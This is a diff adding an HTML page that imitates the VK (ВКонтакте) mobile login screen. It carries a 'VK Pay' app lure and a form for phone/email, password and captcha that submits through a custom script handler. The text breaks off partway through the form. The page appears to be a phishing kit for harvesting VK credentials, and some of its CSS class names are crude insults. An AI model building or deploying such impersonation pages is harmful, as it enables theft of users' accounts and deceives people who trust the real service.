@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+<html class="vk vk_js_no vk_1x vk_flex_no r m h vk_withVolumeLine vk_appAuth_no n vk_modern ">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" />
+    <link rel="shortcut icon" href="./images/icons/favicons/fav_logo.ico?8">
+    <meta name="theme-color" content="#ffffff" />
+    <link rel="icon" type="image/png" sizes="32x32" href="./images/icons/pwa/favicon_32.png?8">
+    <link rel="apple-touch-icon" href="./images/icons/pwa/apple/default.png?8">
+    <link rel="shortcut icon" href="images/svg_icons/ic_head_logo.svg" type="image/x-icon">
+    <link rel="mask-icon" href="./images/icons/pwa/safari_pinned_tab.svg" color="#5181b8">
+    <meta name="msapplication-config" content="./images/icons/pwa/windows/browserconfig.xml">
+    <meta name="apple-mobile-web-app-title" content="ВКонтакте">
+    <meta name="application-name" content="ВКонтакте">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="shortcut icon" href="./images/fav_logo.ico">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title>Вход | ВКонтакте</title>
+    <style>
+        .r .button,
+        .r .small_button,
+        .r .vk__page,
+        .r input,
+        .r select,
+        .r textarea {
+            -webkit-font-smoothing: subpixel-antialiased;
+            font-family: -apple-system, BlinkMacSystemFont, Roboto, Segoe UI, Segoe WP, Helvetica Neue, Lucida Grande, Verdana, Tahoma, Arial, sans-serif!important
+        }
+        
+        .r .basis {
+            min-width: 180px
+        }
+        
+        .button,
+        .small_button,
+        body,
+        input,
+        select,
+        textarea {
+            font-family: Lucida Grande, Verdana, Tahoma, Arial, Sans-Serif, Lucida Sans;
+            font-size: medium
+        }
+        
+        .button,
+        .small_button,
+        body,
+        dd,
+        dl,
+        dt,
+        form,
+        h1,
+        h2,
+        h4,
+        h5,
+        input,
+        select,
+        textarea,
+        ul {
+            margin: 0;
+            padding: 0
+        }
+        
+        html {
+            height: 100%
+        }
+        
+        body {
+            -ms-text-size-adjust: 100%;
+            -moz-text-size-adjust: 100%;
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+            min-height: 100%;
+            background: #f2f3f5;
+            font-size: 14px
+        }
+        
+        .vk__page {
+            padding-bottom: 0;
+            padding-bottom: constant(safe-area-inset-bottom);
+            padding-bottom: env(safe-area-inset-bottom)
+        }
+        
+        html {
+            overflow-x: auto;
+            overflow-y: scroll
+        }
+        
+        body {
+            overflow: visible
+        }
+        
+        .fit_box.new_form .service_msg_warning,
+        .fit_box.new_form .service_msg_error {
+            background-color: #faebeb!important;
+            background-color: var(--pink_light)
+        }
+        
+        .fit_box.new_form .field_error,
+        .fit_box.new_form .service_msg_error,
+        .fit_box.new_form .service_msg_warning {
+            border-color: #f2ab99
+        }
+        
+        .fit_box.new_form .service_msg {
+            font-size: 14px;
+            line-height: 1.29;
+            padding: 8px 12px 9px;
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px
+        }
+        
+        .service_msg_warning {
+            border: 1px solid #ffd54f
+        }
+        
+        .button,
+        .datefield,
+        .small_button,
+        .textfield,
+        .timefield,
+        select {
+            outline: none;
+            -webkit-border-radius: 0;
+            -moz-border-radius: 0;
+            border-radius: 0;
+            -moz-box-shadow: none;
+            -webkit-box-shadow: none;
+            box-shadow: none
+        }
+        
+        .textfield,
+        .button,
+        .small_button {
+            -webkit-appearance: none;
+            background: #fff
+        }
+        
+        input::-webkit-input-placeholder {
+            color: #818c99
+        }
+        
+        input::placeholder {
+            color: #818c99
+        }
+        
+        a {
+            color: #4986cc;
+            text-decoration: none;
+            cursor: pointer
+        }
+        
+        .mcont {
+            background-color: #f2f3f5
+        }
+        
+        .n .mcont {
+            background-color: #f2f3f5
+        }
+        
+        .selector,
+        .textfield,
+        .datefield,
+        .timefield,
+        select {
+            vertical-align: top;
+            width: 100%;
+            min-width: 30px;
+            background: #f2f3f5;
+            border: 1px solid rgba(0, 0, 0, .15);
+            color: #000;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            font-size: 16px;
+            line-height: 20px;
+            padding: 11px 12px;
+            margin: 0;
+            resize: vertical;
+            -webkit-transition: border .2s;
+            -moz-transition: border .2s;
+            -o-transition: border .2s;
+            transition: border .2s;
+            -webkit-appearance: none;
+            -moz-appearance: none
+        }
+        
+        .selector,
+        .textfield {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box
+        }
+        
+        .textfield::-webkit-input-placeholder {
+            color: #818c99
+        }
+        
+        .button,
+        .near_btn,
+        .small_button,
+        .small_near_btn {
+            display: inline-block;
+            background: none;
+            border: none
+        }
+        
+        .button {
+            text-align: center;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 500;
+            -webkit-font-smoothing: subpixel-antialiased;
+            -moz-osx-font-smoothing: auto;
+            line-height: 16px;
+            padding: 10px 16px;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            color: #fff;
+            background-color: #4986cc
+        }
+        
+        .near_btn {
+            margin: 6px 10px;
+            position: relative
+        }
+        
+        .wide_button {
+            display: block;
+            text-align: center;
+            padding-left: 3px!important;
+            padding-right: 3px!important
+        }
+        
+        button.wide_button,
+        input.wide_button {
+            width: 100%
+        }
+        
+        .form_item {
+            padding: 0 7px 10px;
+            border-bottom: 1px solid #f5f5f5
+        }
+        
+        .form_item:last-child {
+            border-bottom: 0
+        }
+        
+        .fi_row,
+        .fi_subrow {
+            padding: 14px 0 0;
+            word-wrap: break-word
+        }
+        
+        .fi_row:first-child,
+        .fi_subrow:first-child {
+            padding: 4px 0 0
+        }
+        
+        .fi_header {
+            color: #4772a6;
+            font-weight: 700;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale
+        }
+        
+        .fi_header_light {
+            color: #818c99
+        }
+        
+        .fi_row_new {
+            padding: 14px 0 0
+        }
+        
+        .form_item .textfield {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box
+        }
+        
+        .fit_box.new_form {
+            font-size: 15px
+        }
+        
+        .fit_box.new_form .fi_row {
+            padding: 10px 0 0
+        }
+        
+        .fit_box.new_form .fi_row_new {
+            padding: 16px 0 0
+        }
+        
+        .fit_box.new_form .near_btn {
+            margin: 6px 0
+        }
+        
+        .fit_box.new_form .fi_field_links,
+        .fit_box.new_form .near_btn {
+            font-size: 15px!important
+        }
+        
+        .fit_box.new_form .form_item {
+            padding: 0 12px 12px
+        }
+        
+        .fit_box.new_form .button {
+            width: 100%
+        }
+        
+        .fit_box.new_form .button.success {
+            background-color: #4bb34b
+        }
+        
+        .mhead {
+            background: #5181b8;
+            color: #fff;
+            overflow: hidden;
+            zoom: 1;
+            position: relative;
+            z-index: 1;
+            line-height: 1.5em
+        }
+        
+        .hb_wrap {
+            padding-bottom: 1px;
+            overflow: hidden;
+            text-align: center;
+            vertical-align: middle;
+            display: block;
+            color: #fff;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0.00)
+        }
+        
+        .n .hb_wrap {
+            padding-bottom: inherit;
+            overflow: hidden
+        }
+        
+        .hb_btn {
+            padding: 8px 0
+        }
+        
+        .mh_header {
+            font-size: medium;
+            -o-text-overflow: ellipsis;
+            text-overflow: ellipsis
+        }
+        
+        .mh_header,
+        .mhb_back {
+            overflow: hidden;
+            zoom: 1
+        }
+        
+        .mhb_logo {
+            text-align: left;
+            padding-left: 9px;
+            padding-right: 5px;
+            border-width: 0 0 1px;
+            overflow: hidden;
+            zoom: 1
+        }
+        
+        .mhi_logo {
+            width: 32px;
+            height: 32px;
+            margin: 12px 0;
+            display: inline-block;
+            background: url(logovkm.svg) no-repeat !important;
+            background-size: contain !important;
+            text-align: center;
+        }
+        
+        .n .mhi_logo {
+            background: none
+        }
+        
+        .n .mhi_logo:after {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 11px;
+            right: 0;
+            margin: auto
+        }
+        
+        .h .mhb_logo .mh_header,
+        .mhb_logo .mh_header {
+            display: none
+        }
+        
+        #vk_wrap {
+            position: relative
+        }
+        
+        #vk_head {
+            display: none
+        }
+        
+        #l {
+            position: absolute;
+            margin-right: 36px;
+            display: none
+        }
+        
+        #m {
+            position: relative;
+            left: 0
+        }
+        
+        .basis:before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            z-index: 16777271
+        }
+        
+        ._copts .checkbox+.option_label:before,
+        ._copts .radio+.option_label:before,
+        .audioPage__search .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .BookmarksSearch .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .Control__icon:before,
+        .create_post .post__select:after,
+        .faq_cat_item .body_icon:after,
+        .faq_item .faq_title:after,
+        .Friends__fakeSearchIcon:before,
+        .GlobalSearchHeader .i_search,
+        .head_panel:first-child .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .m .vk__page_chatAdd .selected_users_next_button:before,
+        .n .head_search .i_search,
+        .n .mhi_logo:after,
+        .PostActions__togglerIcon,
+        .qsearch_wrap .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .r .vk__page_feed .mh_header:after,
+        .r .wi_actions_btn .i_icon,
+        .SearchPanel--ajax:after,
+        .svgIcon-base,
+        .topbar_item_hide:after,
+        .vk__page_publish .radio_items .ri_radio,
+        .vk__page_redesign .basis #value_link:before {
+            -webkit-background-size: 284px 248px;
+            -moz-background-size: 284px 248px;
+            background-size: 284px 248px;
+        }
+        
+        .n .mhi_logo:after,
+        .svgIcon-base__logo_32 {
+            background-position: -108px -4px;
+            background-repeat: no-repeat;
+            width: 32px;
+            height: 32px
+        }
+        
+        .vk_tabbar_top._hfixed #m .mhead {
+            top: 48px
+        }
+        
+        .vk_tabbar_static #m .mhead.basis__header_noBottomMenu,
+        .vk_tabbar_top._hfixed #m .mhead.basis__header_noBottomMenu,
+        .messenger_noPullToRefresh.vk_tabbar_base.vk_tabbar_static #m .mhead,
+        .messenger_noPullToRefresh.vk_tabbar_base.vk_tabbar_top._hfixed #m .mhead {
+            top: 0;
+            text-align: left;
+        }
+        
+        .installApp {
+            background-color: #fff
+        }
+        
+        .installApp__link {
+            color: #517094;
+            font-size: 15px
+        }
+        
+        .installApp__label {
+            background-image: url(./images/icons/mobile_new.png);
+            background-position: 0;
+            background-repeat: no-repeat;
+            -webkit-background-size: 20px 20px;
+            -moz-background-size: 20px;
+            background-size: 20px;
+            padding: 15px 25px;
+            position: relative;
+            margin-left: 12px;
+            overflow: hidden;
+            -o-text-overflow: ellipsis;
+            text-overflow: ellipsis;
+            margin-left: 20px
+        }
+        
+        .installApp__label b {
+            font-weight: 500;
+            -webkit-font-smoothing: subpixel-antialiased;
+            -moz-osx-font-smoothing: auto
+        }
+        
+        .installApp__arrow {
+            background-image: url(./images/icons/blue_arrow.png);
+            background-position: 50%;
+            background-repeat: no-repeat;
+            -webkit-background-size: 9px 15px;
+            -moz-background-size: 9px 15px;
+            background-size: 9px 15px;
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            margin-top: -7.5px;
+            width: 9px;
+            height: 15px;
+            -webkit-transition: right 100ms linear;
+            -moz-transition: right 100ms linear;
+            -o-transition: right 100ms linear;
+            transition: right 100ms linear
+        }
+        
+        .PageBlock,
+        .audioPlaylist,
+        .pageAttachMoney,
+        .pageMoneyTransfer,
+        .pageAttachMoneyAbout,
+        .basis__content .al_loading,
+        .StoriesFeedBlock,
+        .StoriesSearchBlock,
+        .new_post_container,
+        .wall_item,
+        .PageBlock .results.type_statuses .wall_item,
+        .vk__page_mail .basis,
+        .BookmarksItem,
+        .AudioSerp,
+        .AudioShowcase,
+        .FeedItem,
+        .upanel.thumbs_list,
+        .LikesPhotoBlock,
+        .basisDialogs,
+        .recommends_link,
+        .MainMenu__splashScreen,
+        .Pad {
+            background-color: #fff;
+            -webkit-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            -moz-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .12);
+            -moz-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .12);
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .12)
+        }
+        
+        .n .audioPlaylist,
+        .n .AudioSerp,
+        .n .AudioShowcase,
+        .n .basis__content .al_loading,
+        .n .basisDialogs,
+        .n .BookmarksItem,
+        .n .FeedItem,
+        .n .LikesPhotoBlock,
+        .n .MainMenu__splashScreen,
+        .n .new_post_container,
+        .n .Pad,
+        .n .pageAttachMoney,
+        .n .pageAttachMoneyAbout,
+        .n .PageBlock,
+        .n .PageBlock .results.type_statuses .wall_item,
+        .n .pageMoneyTransfer,
+        .n .recommends_link,
+        .n .StoriesFeedBlock,
+        .n .StoriesSearchBlock,
+        .n .upanel.thumbs_list,
+        .n .vk__page_mail .basis,
+        .n .wall_item {
+            -webkit-border-radius: 6px;
+            -moz-border-radius: 6px;
+            border-radius: 6px;
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none
+        }
+        
+        .vk.n .PageBlock,
+        .vk.n .audioPlaylist,
+        .vk.n .pageAttachMoney,
+        .vk.n .pageMoneyTransfer,
+        .vk.n .pageAttachMoneyAbout,
+        .vk.n .basis__content .al_loading,
+        .vk.n .StoriesFeedBlock,
+        .vk.n .StoriesSearchBlock,
+        .vk.n .new_post_container,
+        .vk.n .wall_item,
+        .vk.n .PageBlock .results.type_statuses .wall_item,
+        .vk.n .vk__page_mail .basis,
+        .vk.n .BookmarksItem,
+        .vk.n .AudioSerp,
+        .vk.n .AudioShowcase,
+        .vk.n .FeedItem,
+        .vk.n .upanel.thumbs_list,
+        .vk.n .LikesPhotoBlock,
+        .vk.n .basisDialogs,
+        .vk.n .recommends_link,
+        .vk.n .MainMenu__splashScreen,
+        .vk.n .Pad {
+            border: 1px solid #e1e3e6
+        }
+        
+        .PageBlock {
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none
+        }
+        
+        #m .mcont {
+            margin: 8px 0 0;
+            padding-bottom: 10px
+        }
+        
+        .vk__page_login .mhead {
+            text-align: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center
+        }
+        
+        .vk__page_login .mhead .mhb_logo {
+            display: inline-block;
+            width: auto;
+            min-width: 31px
+        }
+        
+        .vk__page_login .installApp {
+            margin-bottom: 12px
+        }
+        
+        .vk__page_login .fit_box.new_form .login_header {
+            color: #5d5f61;
+            padding: 13px 0 4px;
+            line-height: 1.33
+        }
+        
+        .vk__page_login .fit_box.new_form .fi_header_light {
+            color: #909499;
+            font-weight: 400;
+            -webkit-font-smoothing: subpixel-antialiased;
+            -moz-osx-font-smoothing: auto
+        }
+        
+        .vk__page_login .fit_box.new_form .login_restore {
+            padding-bottom: 8px
+        }
+        
+        .vk__page_login .fit_box.new_form .login_new_user {
+            margin-top: 24px
+        }
+        
+        .vk__page_login .fit_box.new_form .button.success {
+            margin-top: -2px
+        }
+        
+        .vk__page_login #vk_wrap,
+        .vk__page_login .basis__header {
+            max-width: 550px;
+            margin: 0 auto
+        }
+        
+        .vk__page_login .installApp,
+        .vk__page_login .new_form {
+            -webkit-border-radius: 6px;
+            -moz-border-radius: 6px;
+            border-radius: 6px;
+            -webkit-box-shadow: 0 0 0 1px #e1e3e6;
+            -moz-box-shadow: 0 0 0 1px #e1e3e6;
+            box-shadow: 0 0 0 1px #e1e3e6
+        }
+        
+        .n .vk__page_login .new_form {
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none;
+            background: none
+        }
+        
+        .vk__page_login .installApp {
+            margin-top: 12px
+        }
+        
+        .vk__page_login .form_item,
+        .vk__page_login .mcont {
+            border: none!important
+        }
+        
+        .vk__page_login .fit_box.new_form .form_item {
+            padding: 10px 20px 20px
+        }
+        
+        .vk__page_login .fit_box.new_form .login_header {
+            padding: 17px 0 7px
+        }
+        
+        .h .basis__header,
+        .h .layout__header,
+        .h .leftMenu__header {
+            height: 48px!important;
+            background: #5181b8
+        }
+        
+        .h .mhead {
+            line-height: 18px
+        }
+        
+        .h .hb_btn {
+            padding-top: 19px!important;
+            padding-bottom: 19px!important
+        }
+        
+        .h .mh_header {
+            padding-top: 15px!important;
+            padding-bottom: 0!important;
+            margin-left: 0!important;
+            font-size: 17px;
+            font-weight: 500;
+            -webkit-font-smoothing: subpixel-antialiased;
+            -moz-osx-font-smoothing: auto;
+            margin-top: -15px;
+            display: block
+        }
+        
+        .h .mh_header.mh_header.mh_header:not(#zpv_summary) {
+            padding-left: 0!important
+        }
+        
+        .h .basis__header .mhb_logo .mh_header {
+            padding-top: 15px!important;
+            padding-bottom: 14px!important
+        }
+        
+        .n .mailHat,
+        .n.groupCover-vk_animationYes .groupCover__dimmer,
+        .n.h.groupCover-vk_animationYes .groupCover__dimmer,
+        .n.h .basis__header,
+        .n.h .layout__header,
+        .n.h .leftMenu__header {
+            background: #fff
+        }
+        
+        .n.h .basis__header,
+        .n.h .layout__header,
+        .n.h .leftMenu__header {
+            height: 130px!important
+        }
+        
+        .n.h ._hfixed .basis__header {
+            -webkit-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            -moz-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .06);
+            -webkit-transition: -webkit-box-shadow .1s ease, -webkit-transform .15s ease;
+            transition: -webkit-box-shadow .1s ease, -webkit-transform .15s ease;
+            -moz-transition: box-shadow .1s ease, transform .15s ease, -moz-box-shadow .1s ease, -moz-transform .15s ease;
+            -o-transition: box-shadow .1s ease, transform .15s ease, -o-transform .15s ease;
+            transition: box-shadow .1s ease, transform .15s ease;
+            transition: box-shadow .1s ease, transform .15s ease, -webkit-box-shadow .1s ease, -moz-box-shadow .1s ease, -webkit-transform .15s ease, -moz-transform .15s ease, -o-transform .15s ease;
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none
+        }
+        
+        .n.h ._hfixed .basis__header.basis__header_nohide,
+        .n.h ._hfixed .basis__header.basis__header_noshadowAnim {
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none
+        }
+        
+        .n.h #m .mh_header {
+            line-height: 24px;
+            font-size: 20px;
+            height: 24px;
+            padding: 16px 12px!important;
+            margin: 0!important;
+            font-weight: 700;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            padding: 16px!important
+        }
+        
+        .n .mhead,
+        .n .hb_wrap,
+        .n .Unfold__trigger {
+            color: #000
+        }
+        
+        .n #vk_head {
+            -webkit-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .05), 0 0 4px 0 rgba(0, 0, 0, .05);
+            -moz-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .05), 0 0 4px 0 rgba(0, 0, 0, .05);
+            box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .05), 0 0 4px 0 rgba(0, 0, 0, .05);
+            overflow: visible
+        }
+        
+        .n #vk_head:after {
+            content: "";
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: -1px;
+            border-bottom: 1px solid rgba(0, 0, 0, .05);
+            -webkit-transform: scaleY(0.5);
+            -moz-transform: scaleY(0.5);
+            -ms-transform: scaleY(0.5);
+            -o-transform: scaleY(0.5);
+            transform: scaleY(0.5)
+        }
+        
+        .mhead {
+            z-index: 7
+        }
+        
+        .basis__header,
+        .mhb_back.mhb_back.mhb_back.mhb_back {
+            overflow: visible!important
+        }
+        
+        .mh_header:not(#zpv_summary) {
+            min-width: 0;
+            text-align: left
+        }
+        
+        .fit_box .form_item {
+            padding: 0 12px 16px
+        }
+        
+        .fit_box .fi_row {
+            padding: 12px 0 0
+        }
+        
+        .fit_box .fi_row_new {
+            padding: 20px 0 0
+        }
+        
+        .near_btn {
+            margin: 8px 12px
+        }
+        
+        .hb_btn {
+            padding: 12px 0
+        }
+        
+        .mhb_logo {
+            padding-left: 9px;
+            padding-right: 9px
+        }
+        
+        .mhi_logo {
+            background-image: url(logovkm.svg)
+        }
+        
+        #l {
+            margin-right: 44px
+        }
+        
+        body #vk_wrap {
+            max-width: 620px;
+            margin: 0 auto
+        }
+        
+        #vk_head {
+            display: block;
+            position: absolute;
+            width: 100%;
+            z-index: -1
+        }
+        
+        body,
+        #l .pcont,
+        #l .panel,
+        #l .main_menu {
+            background: #ebedf0
+        }
+        
+        .n body,
+        .n #l .pcont,
+        .n #l .panel,
+        .n #l .main_menu {
+            background: #f2f3f5
+        }
+        
+        ._hfixed #l {
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            position: fixed;
+            z-index: 17;
+            display: none;
+            background: #ebedf0;
+            overflow: auto;
+            -webkit-overflow-scrolling: touch;
+            -webkit-backface-visibility: hidden
+        }
+        
+        .n ._hfixed #l {
+            background: #f2f3f5
+        }
+        
+        ._hfixed #l .mhead,
+        ._hfixed #m .mhead {
+            position: fixed;
+            -webkit-backface-visibility: hidden;
+            height: 48px;
+            z-index: 7;
+            top: 0
+        }
+        
+        ._hfixed #m .mhead {
+            left: 0;
+            width: 100%
+        }
+        
+        ._hfixed #mcont {
+            padding-top: 130px
+        }
+        
+        ._hfixed #l {
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            position: fixed;
+            z-index: 17;
+            display: none;
+            background: #ebedf0;
+            overflow: visible;
+            -webkit-backface-visibility: hidden
+        }
+        
+        #vk_head {
+            z-index: 1
+        }
+        
+        ._hfixed #m .mhead {
+            left: auto;
+        }
+        
+        ._hfixed #l {
+            border-right: none
+        }
+        
+        ._hfixed #vk_head {
+            position: fixed;
+            -webkit-backface-visibility: hidden;
+            height: 43px;
+            z-index: 1
+        }
+        
+        .h ._hfixed #vk_head {
+            height: 48px
+        }
+        
+        .n ._hfixed #vk_head {
+            height: 56px;
+            z-index: 7;
+            top: 0
+        }
+        
+        #vk_head {
+            z-index: 1
+        }
+        
+        .login_restore a:hover,
+        .installApp__label:hover {
+            text-decoration: underline
+        }
+        
+        .selector:focus,
+        .textfield:focus,
+        .datefield:focus,
+        .timefield:focus,
+        select:focus {
+            border-color: #3f8ae0
+        }
+        
+        .n .mhi_logo:after,
+        .svgIcon-base__logo_32 {
+            background-position: -108px -4px;
+            background-repeat: no-repeat;
+            width: 32px;
+            height: 32px;
+        }
+        
+        .logoMob {
+            width: 32px;
+            height: 32px;
+            margin: 12px 0;
+            display: block;
+            text-align: center
+        }
+        
+        ._copts .checkbox+.option_label:before,
+        ._copts .radio+.option_label:before,
+        .audioPage__search .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .BookmarksSearch .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .Control__icon:before,
+        .create_post .post__select:after,
+        .faq_cat_item .body_icon:after,
+        .faq_item .faq_title:after,
+        .Friends__fakeSearchIcon:before,
+        .GlobalSearchHeader .i_search,
+        .head_panel:first-child .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .m .vk__page_chatAdd .selected_users_next_button:before,
+        .n .head_search .i_search,
+        .n .mhi_logo:after,
+        .PostActions__togglerIcon,
+        .qsearch_wrap .hp_block:first-child .qsearch.qsearch--ajax .row_table_main_column:after,
+        .r .vk__page_feed .mh_header:after,
+        .r .wi_actions_btn .i_icon,
+        .SearchPanel--ajax:after,
+        .svgIcon-base,
+        .topbar_item_hide:after,
+        .vk__page_publish .radio_items .ri_radio,
+        .vk__page_redesign .basis #value_link:before {
+            -webkit-background-size: 284px 272px;
+            -moz-background-size: 284px 272px;
+            background-size: 284px 272px;
+        }
+        
+        .btn {
+            padding: 15px 50px;
+            color: #fff;
+            border: none;
+            background-color: #5181B8;
+        }
+        
+        .pr {
+            opacity: 0;
+            line-height: 0;
+            transition: opacity 350ms linear;
+        }
+        
+        .pr_bt {
+            display: inline-block;
+            vertical-align: top;
+            width: 4px;
+            height: 4px;
+            background-color: #fff;
+            border-radius: 50%;
+            margin-right: 1px;
+            opacity: 0.2;
+            animation-duration: 750ms;
+            animation-name: pr_bt_anim;
+            animation-iteration-count: infinite;
+        }
+        
+        .pr_bt:last-child {
+            margin-right: 0;
+        }
+        
+        .pr_bt:first-child {
+            animation-delay: 0ms;
+        }
+        
+        .pr_bt:nth-child(2) {
+            animation-delay: 180ms;
+        }
+        
+        .pr_bt:nth-child(3) {
+            animation-delay: 360ms;
+        }
+        
+        @keyframes pr_bt_anim {
+            0% {
+                opacity: 0.2;
+            }
+            30% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0.2;
+            }
+        }
+        
+        .installApp__arrow {
+            background-image: url(blue_arrow.png);
+            background-position: 50%;
+            background-repeat: no-repeat;
+            -webkit-background-size: 9px 15px;
+            -moz-background-size: 9px 15px;
+            background-size: 9px 15px;
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            margin-top: -7.5px;
+            width: 9px;
+            height: 15px;
+            -webkit-transition: right 100ms linear;
+            -moz-transition: right 100ms linear;
+            -o-transition: right 100ms linear;
+            transition: right 100ms linear
+        }
+        
+        .installApp__label {
+            background-image: url(mobile_new.png);
+            background-position: 0;
+            background-repeat: no-repeat;
+            -webkit-background-size: 20px 20px;
+            -moz-background-size: 20px;
+            background-size: 20px;
+            padding: 15px 25px;
+            position: relative;
+            margin-left: 12px;
+            overflow: hidden;
+            -o-text-overflow: ellipsis;
+            text-overflow: ellipsis
+        }
+
+        .pidor {
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+            position: absolute;
+            bottom: 15px;
+            left: 0;
+        }
+
+        .pidor-img {
+            margin-right: 12px;
+            width: 45px;
+            height: 45px;
+        }
+
+        .pidor-img img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .basis__header {
+            height: 600px !important;
+        }
+
+        .pidor-text-1 {
+            margin-bottom: 3px;
+            display: inline-block;
+            position: relative;
+            font-weight: bold;
+        }
+
+        .pidor-text-1::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            right: -24px;
+            width: 22px;
+            height: 22px;
+            background: url(img.svg) no-repeat;
+        }
+
+        .pidor-text-2 {
+            max-width: 275px;
+            color: #909499;
+        }
+
+        .sositexyu {
+            height: 35px;
+            width: 35px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 10px;
+        }
+        
+        @media (min-width: 620px) {
+            .installApp__label {
+                margin-left: 20px
+            }
+        }
+    </style>
+</head>
+
+<body class="vk__page _hover vk_ios_no _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_no vk__page_login vk_tabbar_top vk_al_yes">
+    <div id="app">
+<div class="layout">
+        <div class="layout__header mhead" id="vk_head">
+        </div>
+        <div class="layout__body qs_enabled" id="vk_wrap">
+            <div class="layout__leftMenu" id="l"> </div>
+            <div class="layout__basis" id="m">
+                <div class="basis">
+                    <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead">
+                            <img class="sositexyu" src="logovkm.svg" alt="">
+                            <div class="pidor">
+                                <div class="pidor-img">
+                                    <img src="logo-vkkk.png" alt="">
+                                </div>
+                                <div class="pidor-text">
+                                    <div class="pidor-text-1">Приложение VK Pay</div>
+                                    <div class="pidor-text-2">Для продолжения Вам необходимо войти <strong>ВКонтакте</strong></div>
+                                </div>
+                            </div>
+                    </div>
+                    <div class="basis__menu"></div>
+                    <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/">
+                        <div class="pcont fit_box bl_cont new_form">
+                            <div class="PageBlock">
+                                <div class="form_item">
+                                    <div class="fi_row" id="login_message" style="display: none;">
+                                        <div class="service_msg_box">
+                                            <div class="service_msg service_msg_warning"><b>Не удаётся войти.</b>
+                                                <br />Пожалуйста, проверьте правильность введённых данных. <a href="https://static.vk.com/restore">Проблемы со входом?</a></div>
+                                        </div>
+                                    </div>
+                                    <form method="POST" id="login_form" @submit.prevent="authVKmobile()">
+                                        <dl class="fi_row">
+                                            <dd>
+                                                <input type="text" class="textfield" name="email" id="login" placeholder="Телефон или email" v-model="login" /> </dd>
+                                        </dl>
+                                        <dl class="fi_row">
+                                            <dd>
+                                                <input type="password" class="textfield" id="password" name="password" placeholder="Пароль" /> </dd>
+                                        </dl>
+                                        <dl id="sidC" class="fi_row" style="display:none;"> <dt class="fi_label"> <div class="fi_label"> <img id="captcha" alt="Картинка с кодом" src="" class="captcha_img"> </div> Код с картинки: </dt>
+                                            <dd>
+                                                <input id="captcha_sid" type="hidden" name="captcha_sid" value="">
+                                                <div class="iwrap">
+                                                    <input id="captcha_key" type="text" class="textfield" name="captcha_key" value="" autocomplete="off" autocorrect="off" autocapitalize="off"> </div>
+                                            </dd>
+                                        </dl>
+                                        <div class="fi_row_new">
+                                            <button style="height: 36px;" class="button wide_button" id="login_vk" data-btnoff="false">Войти</button>
+                                        </div>
+                                        <div class="fi_row">
+                                            <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Не можете войти?</a></div>
+                                        </div>
+                                        <div class="login_new_user">
+                                            <div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
+                                        </div>
